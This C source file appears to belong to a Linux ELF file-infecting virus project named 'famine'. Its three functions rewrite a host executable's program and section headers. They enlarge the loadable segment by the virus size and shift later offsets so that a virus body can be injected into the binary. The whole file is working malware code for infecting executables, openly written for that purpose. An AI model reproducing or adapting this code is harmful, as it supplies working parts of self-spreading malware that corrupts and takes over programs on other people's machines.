#include "famine.h"

void		*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment, t_elf *virus_elf)
{
	uint64_t	p_filesz;
	uint64_t	p_memsz;

	ft_memcpy(*dst, src, (unsigned long)&segment->p_filesz - (unsigned long)src);
	*dst += (unsigned long)&segment->p_filesz - (unsigned long)src;
	src = &segment->p_filesz;
	p_filesz = segment->p_filesz + virus_elf->size + INJECT_SIZE;
	ft_memcpy(*dst, &p_filesz, sizeof(segment->p_filesz));
	*dst += sizeof(segment->p_filesz);
	src += sizeof(segment->p_filesz);
	p_memsz = segment->p_memsz + virus_elf->size + INJECT_SIZE;
	ft_memcpy(*dst, &p_memsz, sizeof(segment->p_memsz));
	*dst += sizeof(segment->p_memsz);
	src += sizeof(segment->p_memsz);
	return (src);
}

void		*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
{
	int				size;
	Elf64_Off		shoff;

	size = get_size_needed(elf, virus_elf);
	shoff = elf->header->e_shoff + nb_zero + size;
	ft_memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
	ft_memcpy(*dst, &shoff, sizeof(shoff));
	*dst += sizeof(shoff);
	src = (void *)&elf->header->e_shoff + sizeof(elf->header->e_shoff);
	for (int i = 0; i < elf->header->e_phnum; i++)
	{
		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
		{
			shoff = elf->segments[i].p_offset + nb_zero + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->segments[i].p_offset - (unsigned long)src);
			*dst += (unsigned long)&elf->segments[i].p_offset - (unsigned long)src;
			ft_memcpy(*dst, &shoff, sizeof(shoff));
			*dst += sizeof(shoff);
			src = (void *)&elf->segments[i].p_offset + sizeof(elf->segments[i].p_offset);
		}
		else if ((unsigned long)&elf->segments[i] == (unsigned long)elf->pt_load)
			src = update_segment_sz(src, dst, elf->pt_load, virus_elf);
	}
	return (src);
}

void		*add_padding_sections(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
{
	int				size;
	Elf64_Off		shoff;

	size = get_size_needed(elf, virus_elf);
	for (int i = 0; i < elf->header->e_shnum; i++)
	{
		if ((unsigned long)elf->sections[i].sh_offset > elf->pt_load->p_offset + elf->pt_load->p_filesz)
		{
			shoff = elf->sections[i].sh_offset + nb_zero + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src);
			*dst += (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src;
			ft_memcpy(*dst, &shoff, sizeof(shoff));
			*dst += sizeof(shoff);
			src = (void *)&elf->sections[i].sh_offset + sizeof(elf->sections[i].sh_offset);
		}
	}
	return (src);
}
